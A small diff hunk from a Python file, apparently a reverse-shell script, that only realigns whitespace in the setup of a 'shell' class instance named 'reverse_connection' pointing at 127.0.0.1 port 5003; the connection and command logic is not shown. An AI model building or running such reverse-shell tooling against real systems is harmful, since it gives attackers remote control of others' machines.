@@ -26,9 +26,9 @@ class shell:
     
     def __init__(self, target_address, target_port): # assign the target address and the target port
         self.target_address = target_address
-        self.target_port = target_port
+        self.target_port    = target_port
         
-reverse_connection = shell("127.0.0.1", int(5003)) # define target ip address and target port
+reverse_connection          = shell("127.0.0.1", int(5003)) # define target ip address and target port
 
 if __name__ == "__main__":
     os.system('clear')
